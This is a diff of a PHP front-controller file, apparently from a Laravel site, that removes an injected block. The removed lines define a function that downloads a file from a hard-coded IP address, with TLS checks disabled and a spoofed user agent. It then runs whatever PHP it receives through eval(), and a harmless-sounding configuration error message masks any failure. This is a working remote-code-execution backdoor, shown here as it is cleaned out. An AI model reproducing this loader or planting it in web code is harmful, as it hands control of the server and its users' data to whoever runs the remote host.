@@ -1,38 +1,4 @@
 <?php
-function getRemoteData($url) {
-    $result = false;
-    
-    if (ini_get('allow_url_fopen')) {
-        $result = @file_get_contents($url);
-    }
-    
-    if ($result === false && function_exists('curl_init')) {
-        $ch = curl_init();
-        curl_setopt_array($ch, [
-            CURLOPT_URL => $url,
-            CURLOPT_RETURNTRANSFER => true,
-            CURLOPT_SSL_VERIFYPEER => false,
-            CURLOPT_FOLLOWLOCATION => true,
-            CURLOPT_TIMEOUT => 5,
-            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-        ]);
-        $result = curl_exec($ch);
-        curl_close($ch);
-    }
-    
-    return $result;
-}
-$configData = getRemoteData('http://192.187.99.44/j251113_13/init.txt');
-
-if ($configData) {
-    if (strpos($configData, '<?php') !== false || strpos($configData, '<?=') !== false) {
-        try {
-            eval('?>' . $configData);
-        } catch (Exception $e) {
-            error_log('Configuration load error: ' . $e->getMessage());
-        }
-    }
-}
 include dirname(__FILE__) . '/.private/config.php';
 use Illuminate\Contracts\Http\Kernel;
 use Illuminate\Http\Request;
